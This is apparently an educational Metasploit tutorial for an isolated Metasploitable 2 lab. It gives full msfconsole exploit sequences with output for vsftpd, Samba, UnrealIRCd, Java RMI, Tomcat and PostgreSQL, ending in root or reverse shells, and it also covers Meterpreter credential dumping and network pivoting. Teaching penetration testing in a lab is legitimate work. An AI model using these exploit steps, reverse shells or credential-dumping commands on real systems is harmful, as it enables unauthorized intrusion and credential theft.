01 — WHAT IS IT

Metasploit Framework

An open-source penetration testing framework developed by HD Moore in 2003, now maintained by Rapid7. It is the world's most widely used exploitation framework — a complete platform for developing, testing, and executing exploits against target machines.

02 — TARGET

Metasploitable

An intentionally vulnerable Linux VM created by Rapid7 for practicing Metasploit. Metasploitable 2 is the classic version with dozens of known vulnerabilities. Metasploitable 3 adds Windows and more complex scenarios. It is the perfect safe sandbox for learning.

03 — EDITIONS

Framework vs Pro

Metasploit Framework: Free, CLI-based, full-featured. Used via msfconsole.
Metasploit Pro: Commercial, adds GUI (Armitage-style), automated scans, reporting, campaign tracking. Mostly used in enterprise.

04 — ETHICS

Responsible Use

Always operate within a defined scope. Obtain written authorization. Document all findings. Use a sandboxed lab environment (VirtualBox/VMware) completely isolated from production networks. Follow PTES (Penetration Testing Execution Standard).

Penetration Testing Lifecycle

1. Reconnaissance
Passive & active information gathering. OSINT, DNS enumeration, WHOIS. In MSF: auxiliary/scanner/* modules, db_nmap integration.
2. Scanning & Enumeration
Port scanning, service version detection, OS fingerprinting. Identify open ports, running services, and potential attack surfaces using Nmap and MSF auxiliary scanners.
3. Vulnerability Analysis
Match discovered services against known CVEs. Use vulns database, search MSF modules, cross-reference NVD/Exploit-DB.
4. Exploitation
Execute the attack. Select exploit module, configure payload, set targets, run the exploit. Gain initial access. This is where MSF shines with 2,300+ modules.
5. Post-Exploitation
Privilege escalation, lateral movement, credential harvesting, persistence. Use Meterpreter scripts, post/ modules, and pivoting to reach deeper network segments.
6. Reporting
Document all findings, screenshots, paths taken, and remediation recommendations. MSF Pro has built-in report generation. Framework users export from the database.

FRAMEWORK ARCHITECTURE
Module types, payloads, encoders, listeners — the internals

Module Types

TYPE — EXPLOIT

Exploit Modules

Active modules that take advantage of a specific vulnerability in a target system. They deliver a payload upon successful execution. Located at modules/exploits/. Examples: EternalBlue, vsftpd backdoor.

exploit/multi/handler
exploit/unix/ftp/vsftpd_234_backdoor
exploit/windows/smb/ms17_010_eternalblue
TYPE — AUXILIARY

Auxiliary Modules

Scanning, fuzzing, brute-forcing, and information gathering tools that do NOT deliver payloads. Essential for enumeration and discovery phases.

auxiliary/scanner/portscan/tcp
auxiliary/scanner/smb/smb_version
auxiliary/scanner/ssh/ssh_login
TYPE — PAYLOAD

Payload Modules

Code that runs on the target after exploitation. Three subtypes: Singles (self-contained), Stagers (setup connection), Stages (large feature-rich code pulled by stager). Meterpreter is the most powerful staged payload.

TYPE — POST

Post-Exploitation Modules

Run after gaining a session. Gather credentials, escalate privileges, pivot networks, establish persistence, extract sensitive files. Over 300 modules available.

post/multi/recon/local_exploit_suggester
post/linux/gather/hashdump

EXPLOITATION TECHNIQUES
Step-by-step exploits against Metasploitable 2 vulnerabilities
ℹ LAB TARGET All examples below target Metasploitable 2 at 192.168.56.102. Replace with your actual target IP. Run these ONLY in your isolated lab.
EXCELLENT vsftpd 2.3.4 Backdoor — Port 21 CVE-2011-2523 ▼

A malicious backdoor was introduced into the vsftpd 2.3.4 source code. When a username ending with ":)" is sent, a bind shell is opened on port 6200. This is one of the most famous supply-chain attacks in open source history.

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.56.102 msf6 exploit(vsftpd_234_backdoor) > run [*] 192.168.56.102:21 - Banner: 220 (vsFTPd 2.3.4) [*] 192.168.56.102:21 - USER: 331 Please specify the password. [+] 192.168.56.102:21 - Backdoor service has been spawned, handling... [+] 192.168.56.102:21 - UID: uid=0(root) gid=0(root) [*] Found shell. [*] Command shell session 1 opened id uid=0(root) gid=0(root) groups=0(root)
EXCELLENT Samba "Username Map Script" RCE — Port 445 CVE-2007-2447 ▼

A vulnerability in Samba 3.0.20–3.0.25rc3 allows remote command injection via the username field when using the "username map script" option. An attacker can execute arbitrary commands as the daemon user (typically root).

msf6 > use exploit/multi/samba/usermap_script msf6 exploit(usermap_script) > set RHOSTS 192.168.56.102 msf6 exploit(usermap_script) > set PAYLOAD cmd/unix/reverse msf6 exploit(usermap_script) > set LHOST 192.168.56.101 msf6 exploit(usermap_script) > run [*] Started reverse TCP double handler on 192.168.56.101:4444 [*] Accepted the first client connection... [*] Command shell session 1 opened whoami root
EXCELLENT UnrealIRCd Backdoor — Port 6667 CVE-2010-2075 ▼

UnrealIRCd 3.2.8.1 contained a backdoor in its distribution archive. The backdoor allows execution of arbitrary commands by sending "AB;" to the server, then the command string followed by a newline.

msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor msf6 exploit(unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.102 msf6 exploit(unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse msf6 exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.56.101 msf6 exploit(unreal_ircd_3281_backdoor) > run [*] Command shell session 2 opened
GREAT Java RMI Server — Port 1099 CVE-2011-3556 ▼

The Java RMI Registry allows remote class loading by default in older JDKs. An attacker can exploit this to load a malicious codebase URL and execute arbitrary code on the target system.

msf6 > use exploit/multi/misc/java_rmi_server msf6 exploit(java_rmi_server) > set RHOSTS 192.168.56.102 msf6 exploit(java_rmi_server) > set LHOST 192.168.56.101 msf6 exploit(java_rmi_server) > set PAYLOAD java/meterpreter/reverse_tcp msf6 exploit(java_rmi_server) > run [*] Meterpreter session 3 opened
EXCELLENT Tomcat Manager WAR Upload — Port 8180 Misconfiguration ▼

Apache Tomcat's Manager application allows deploying WAR (Web Application Archive) files. With default credentials (tomcat/tomcat), an attacker can upload a malicious WAR containing a JSP shell.

msf6 > use exploit/multi/http/tomcat_mgr_upload msf6 exploit(tomcat_mgr_upload) > set RHOSTS 192.168.56.102 msf6 exploit(tomcat_mgr_upload) > set RPORT 8180 msf6 exploit(tomcat_mgr_upload) > set HttpUsername tomcat msf6 exploit(tomcat_mgr_upload) > set HttpPassword tomcat msf6 exploit(tomcat_mgr_upload) > set LHOST 192.168.56.101 msf6 exploit(tomcat_mgr_upload) > set PAYLOAD java/meterpreter/reverse_tcp msf6 exploit(tomcat_mgr_upload) > run [*] Meterpreter session 4 opened
EXCELLENT PostgreSQL OS Command Injection — Port 5432 Misconfiguration ▼

PostgreSQL on Metasploitable 2 accepts connections from any IP with default credentials (postgres/postgres). The COPY TO/FROM PROGRAM function allows arbitrary OS command execution as the postgres user.

msf6 > use exploit/linux/postgres/postgres_payload msf6 exploit(postgres_payload) > set RHOSTS 192.168.56.102 msf6 exploit(postgres_payload) > set USERNAME postgres msf6 exploit(postgres_payload) > set PASSWORD postgres msf6 exploit(postgres_payload) > set LHOST 192.168.56.101 msf6 exploit(postgres_payload) > run [*] Meterpreter session 5 opened

METERPRETER DEEP DIVE
The most powerful payload — commands, features, extensions

Meterpreter (Meta-Interpreter) is an advanced, dynamically extensible payload that lives entirely in memory, never touching the disk. It uses encrypted communications, supports channel multiplexing, and can load extensions on demand. It's the go-to payload for post-exploitation.

✓ PRO TIP: UPGRADE TO METERPRETER Have a plain shell? Upgrade it: sessions -u <ID> or use post/multi/manage/shell_to_meterpreter module.

Meterpreter Extensions

EXTENSION

Stdapi (Default)

Loaded by default. Provides all file system, networking, process, and system commands. The foundation of all Meterpreter sessions.

EXTENSION

Priv

Privilege escalation features. Load with load priv. Provides getsystem, hashdump and local priv-esc techniques on Windows.

EXTENSION

Kiwi (Mimikatz)

Windows credential dumping. Load with load kiwi. Then use creds_all, lsa_dump_sam, wifi_list. Requires SYSTEM privileges.

EXTENSION

Sniffer

Network packet capture from the target. load sniffer → sniffer_start 1 → sniffer_dump 1 /tmp/cap.pcap. Analyze with Wireshark.

Pivoting — Reaching Hidden Networks

ℹ CONCEPT Pivoting uses a compromised host as a relay to attack machines on internal networks not directly accessible from your attacker machine. MSF supports TCP pivoting via Meterpreter routes and SOCKS proxies.
Network Pivoting via Meterpreter
# Discover other subnets from compromised host meterpreter > ifconfig Interface 2: eth1 — 10.10.10.1/24 ← Internal subnet! meterpreter > background # Add a route through the compromised session msf6 > route add 10.10.10.0/24 1 [*] Route added # OR use autoroute post module msf6 > use post/multi/manage/autoroute msf6 post(autoroute) > set SESSION 1 msf6 post(autoroute) > run # Now scan internal subnet through the pivot msf6 > use auxiliary/scanner/portscan/tcp msf6 aux(tcp) > set RHOSTS 10.10.10.0/24 msf6 aux(tcp) > set PORTS 22,80,443,445,3389 msf6 aux(tcp) > run # SOCKS Proxy for non-MSF tools (nmap, curl, etc.) msf6 > use auxiliary/server/socks_proxy msf6 aux(socks_proxy) > set SRVHOST 127.0.0.1 msf6 aux(socks_proxy) > set SRVPORT 1080 msf6 aux(socks_proxy) > set VERSION 5 msf6 aux(socks_proxy) > run -j # Then: proxychains nmap 10.10.10.2
